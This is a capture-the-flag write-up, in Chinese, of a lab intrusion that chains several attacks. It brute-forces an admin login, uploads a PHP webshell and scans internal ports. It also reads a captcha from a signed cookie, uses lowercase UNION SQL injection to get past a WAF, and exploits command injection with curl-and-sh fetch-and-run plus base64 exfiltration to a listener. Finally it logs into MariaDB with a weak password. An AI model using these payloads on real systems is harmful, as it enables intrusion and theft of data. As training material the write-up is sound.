## 题目原文

> 某公司的官网似乎存在安全漏洞。作为安全研究员，你需要从外网入手，逐步渗透进入公司内网，最终获取核心机密数据。

四台机器：官网容器（第一面）、内网 OA（第二、三面）、内网 MariaDB（第四面）。

## 题解

### 入口与指纹

官网是 PHP 站点（`nginx/1.18.0` + `PHP/7.4.33`），首页导航直接给出后台入口 `/admin/login.php`。目录字典能扫出 `admin/upload.php` 和 `uploads/`：

- `/admin/` 目录索引 403，`/uploads/` 403。
- `/admin/upload.php` 未登录时 302 到登录页。

### 关键观察

**1. 上传点的黑名单漏了 `.php`。**

读源码（拿到 shell 后即可确认）：

```php
$blocked_exts = ['exe', 'bat', 'cmd', 'sh', 'cgi'];   // 没有 php
$allowed_types = [..., 'application/x-php', 'text/x-php', 'text/plain'];
```

后缀黑名单不含 `php`，`Content-Type` 白名单还主动包含了 PHP 类型，而且类型来自客户端可以伪造。登录后即可直接上传 webshell。

**2. 验证码明文在签名 cookie 里。**

OA 登录页有 4 位数字验证码。抓包看 `/captcha.png` 的响应：

```
Set-Cookie: session=eyJjYXB0Y2hhIjoiOTY3NyJ9.at8ncQ.SMkho2wuUeaXpXMB3EGjMYQ9j4
```

JWT 的第一段是 Base64URL 的 `{"captcha":"9677"}`。**签名不加密**，不用看图、不用 OCR，直接解第一段就能拿到验证码，再带上同一个 cookie 提交表单。

**3. `/api/employees` 是拼接 SQL，WAF 只拦大写。**

```bash
name='
# {"error":"unrecognized token: \"'\""}   → SQLite
```

后端是 SQLite。`UNION`/`SELECT` 的大写形式被关键字黑名单拦，但**小写形式没有**：

```bash
name=' union select 1,2,3,4,5-- -
# [{"dept":3,"email":5,"id":1,"name":2,"phone":4}, ...]
```

`sqlite_master` 里有三张表：`employees`、`users`、`admin_secrets`。

**4. 后台的 Ping 诊断是命令注入。**

`/admin/system` 的「网络诊断」把 `target` 拼进 shell：

```php
$target = request.form['target']
# /bin/sh -c "ping -c 1 " + target
```

过滤挡 `;`、`|`、`&`、`>`，但 **`$()` 不挡**。容器里 `ping` 本身没有执行权限（`Operation not permitted`），所以盲打不行，需要带外回连——这正是把 web 容器当接收端的原因。

### 利用链

**Step 1：登录后台，上传 webshell。**

后台口令用常见口令字典爆破，命中 `admin:Admin@123`。登录后带 CSRF token 上传：

```bash
TOK=$(curl -s -b cj -c cj http://$T/admin/upload.php \
      | grep -oE 'name="csrf_token" value="[^"]+"' | sed -E 's/.*value="([^"]+)"/\1/')

printf '<?php echo "UP:"; system($_GET["c"]); ?>' > shell.php
curl -s -b cj -c cj \
  -F "csrf_token=$TOK" \
  -F "attachment=@shell.php;type=image/png;filename=shell.php" \
  http://$T/admin/upload.php
# ✅ 文件上传成功！路径：/uploads/shell.php
```

请求 `/uploads/shell.php?c=id` 确认执行，然后读 `/challenge/flag1.txt`。

**Step 2：从 web 容器看内网。**

```bash
ip -4 addr            # 172.19.0.3
for i in $(seq 1 40); do
  for p in 22 80 3306 6379 8080; do
    timeout 1 bash -c "echo > /dev/tcp/172.19.0.$i/$p" 2>/dev/null && echo "172.19.0.$i:$p"
  done
done
# 172.19.0.2:8080 → OA
# 172.19.0.4:3306 / 6379 → MariaDB / Redis
```

**Step 3：从 cookie 读验证码，登录 OA。**

```python
import base64, json, re
jwt = "eyJjYXB0Y2hhIjoiOTY3NyJ9.at8ncQ.SMkho2wuUeaXpXMB3EGjMYQ9j4"
p = jwt.split('.')[0]
p += '=' * (-len(p) % 4)
print(json.loads(base64.urlsafe_b64decode(p)))   # {'captcha': '9677'}
```

OA 账号同样是 `admin:1qaz@WSX`（键盘组合口令）。登录后 `/admin` 页面直接渲染「管理员机密信息」，里面是一面 flag，并给出内网核心库地址。

**Step 4：SQL 注入补全信息。**

```bash
# 表结构
name=' union select 1,sql,type,3,4 from sqlite_master-- -
# 用户与口令 hash
name=' union select id,username,password,display_name,role from users-- -
```

`users` 表里是 SHA-256。用本地口令表对 `admin` 的 hash 做强碰撞，命中 `1qaz@WSX`，与登录口令一致。`admin_secrets` 表还留了提示：

```
admin_password_hash  → 67727a41...
admin_password_hint  → 该密码为键盘组合弱口令，格式: 键盘列+特殊字符+键盘列
internal_network     → 192.168.20.0/24 - 核心数据服务器区域
db_server            → 192.168.20.30 - Redis:6379 / MySQL:3306
```

注意：`SELECT` 关键字过滤大小写敏感，`group_concat(hex(value))` 里 `value` 如果被替换成空就会语法错误，需要换列名或加注释绕开。

**Step 5：后台命令注入，带外回连。**

`ping` 在容器里不可执行，所以不能靠页面回显。做法是让目标反连 web 容器（`172.19.0.3`），由 web 容器收结果。

web 容器上两个最小服务就够：

```php
// 1) 发脚本：把 /tmp/oa_srv.sh 的内容当作 HTTP 响应返回
$srv = stream_socket_server("tcp://0.0.0.0:9000");
$c = stream_socket_accept($srv, 30);
fwrite($c, "HTTP/1.1 200 OK\r\nContent-Length: " . filesize('/tmp/oa_srv.sh')
        . "\r\nConnection: close\r\n\r\n" . file_get_contents('/tmp/oa_srv.sh'));

// 2) 收结果：把请求行里的 ?d= 参数写进 /tmp/rx.txt
$srv = stream_socket_server("tcp://0.0.0.0:9001");
$c = stream_socket_accept($srv, 30);
fwrite($c, "HTTP/1.1 200 OK\r\nContent-Length: 2\r\nConnection: close\r\n\r\nok");
file_put_contents('/tmp/rx.txt', fgets($c));
```

要执行的命令写进 `/tmp/oa_srv.sh`，格式固定为「执行 + base64 + 回连」：

```bash
#!/bin/sh
d=$( { cat /challenge/flag3.txt ; } 2>&1 | base64 -w0 )
curl -s "http://172.19.0.3:9001/?d=$d" >/dev/null 2>&1
```

注入的 payload 只需要十几个字符：

```
$(sh -c "$(curl -s http://172.19.0.3:9000/s)")
```

外层 `$()` 让 `ping` 的参数里出现命令替换，内层先拉脚本再交给 `sh` 执行。结果以 base64 出现在接收端的请求行里，解回来即可。注意输入有长度上限（超长会返回「输入过长」），所以脚本内容走带外加载，不要塞进 payload。

拿到执行后：

```bash
cat /challenge/flag3.txt
ls -la /app/src; cat /app/src/app.py; cat /app/entrypoint.sh
```

`/app/src/app.py` 注释里写清了三面 flag 的位置，`/app/data/.flask_secret` 是 Flask 的签名密钥。

**Step 6：内网 MariaDB。**

核心库是 MariaDB 5.5.5-10.11.11，弱口令 `root:root`。直接从 web 容器连（本机也能连）：

```
databases: corporate, information_schema, mysql, performance_schema, sys, test
corporate.tables: audit_log, internal_config, secrets
```

`corporate.secrets` 表：

| id | key | value |
| --- | --- | --- |
| 1 | corporate_secret | 最后一面 flag |
| 2 | db_admin_note | 备注 |
| 3 | backup_key | `aes256-cbc-pkcs7-...` |
| 4 | last_backup | 时间 |

`corporate.internal_config` 里有 OA、web、Redis 的地址，可以交叉验证拓扑。

### flag 位置

| flag | 位置 |
| --- | --- |
| 1 | 官网容器 `/challenge/flag1.txt`，上传 webshell 后读 |
| 2 | OA `/admin` 页面的「管理员机密信息」 |
| 3 | OA 容器 `/challenge/flag3.txt`，Ping 命令注入后读 |
| 4 | 内网 MariaDB `corporate.secrets.corporate_secret` |

### 复盘

- **上传点先看黑名单缺什么，不要一上来就想着图片马**：本例后缀黑名单漏了 `php`，Content-Type 还能伪造，直接传 `.php` 即可。
- **签名 cookie 不是密文。** JWT 的 payload 是 Base64URL 明文，验证码、用户名、角色这类字段都可能直接读出来；需要伪造时再考虑密钥。
- **WAF 的关键字匹配常常区分大小写。** 大写被拦时先试小写或混合大小写，再考虑注释、编码。
- **命令注入先确认「谁在执行、输出在哪里」**：容器里 `ping` 没有权限，但 `$()` 仍然执行了，所以要在同一台机器上换一个能回连的方式，而不是把「没有回显」当成「没有注入」。
- **内网弱口令优先于复杂利用。** 核心库 `root:root` 是四步里最便宜的一步，但只有先拿到 web 容器的执行权限才够得着。
